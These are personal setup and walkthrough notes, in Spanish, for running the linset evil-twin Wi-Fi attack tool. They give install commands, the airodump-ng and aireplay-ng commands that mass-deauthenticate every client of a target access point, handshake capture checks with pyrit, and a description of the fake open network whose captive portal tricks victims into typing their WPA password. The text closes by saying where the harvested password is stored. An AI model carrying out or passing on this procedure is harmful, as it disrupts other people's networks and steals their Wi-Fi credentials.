git co https://github.com/vk496/linset.git
cd linset
chmod a+x linset
vi linset
Buscar "egrep -a" y cambiar por "egrep -w -a"
  Sin este cambio se puede colar alguna red que lleve la palabra Cliente

Requisitos arch:
pacman -S community/aircrack-ng community/hostapd extra/lighttpd extra/xterm community/macchanger extra/php-cgi extra/dhcp community/scapy
packer -S mdk3 pyrit


Algo tipo:
airmon-ng start xxx
Arranca esta interfaz en modo promiscuo
25: mon0: <BROADCAST,ALLMULTI,PROMISC,NOTRAILERS,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 74:de:2b:ef:5b:71 brd ff:ff:ff:ff:ff:ff

vk496 ->
  choosescan ->
    Scan ->
      Scaneo redes:
      airodump-ng -w /tmp/TMPlinset/dump -a mon0
      Cuando hayamos visto la que queremos podemos cerrar la xterm
    selection ->
      elegimos red
      askAP ->
        elegir tipo de HostAP: recomienda hostapd
        handshakelocation ->
          Nos pregunta si tenemos ya un .cap, si decimos que no
          deauthforce ->
            Pregunta que tipo usar, elegimos pyrit
            handshakemode="hard"; askclientsel ->
              Tipo de deauth a utilizar, elegimos "Realizar desaut. masiva al AP objetivo"
              Esto empieza un escaneo, y en paralelo deautentica a todos los usuarios para que se tengan que volver a conectar
              deauth all ->
                capture & deauthall
                CSVDB=$Host_MAC-01.csv
                capture:
                  airodump-ng --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
                deauthall:
                  aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
              deauthMENU
                Nos pregunta si se capturo el handshake (aparece en una de las xterm, arriba a la izquierda)
                Si damos a "Si" -> checkhandshake -> (mira que se haya capturado un handshake)
                  cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap
                  pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"
                    Ejecutando manualmente veo que me puede dar estos errores:
                      IOError: libpcap-error while reading: truncated dump file; tried to read 16 header bytes, only got 2
                      IOError: libpcap-error while reading: truncated dump file; tried to read 847 captured bytes, only got 670
                      Tengo que esperar un rato para que capture suficiente información.
Una vez que esto ha funcionado, arrancará el "web interface"
Esto lo que hace es crear una red del mismo nombre pero sin auth.
Cuando el cliente ve que no puede conectarse a la suya (porque el airocrack le está haciendo deauth todo el rato), verá que hay otra red con el mismo nombre pero sin auth (a mi con android no se ha seleccionado automáticamente). Si se conecta ahí, le saldrá un portal cautivo donde le pedirá la password de la WPA.
Si la mete, se comprobará la password atacando a la captura que ya tenemos, y en caso de ser correcta, le saltará un mensaje de que ahora se conecta, se desmonta el hostap y se deja al cliente conectarse a su red normal.

Si el programa no nos da la password, mirar en
/tmp/TMPlinset/data.txt



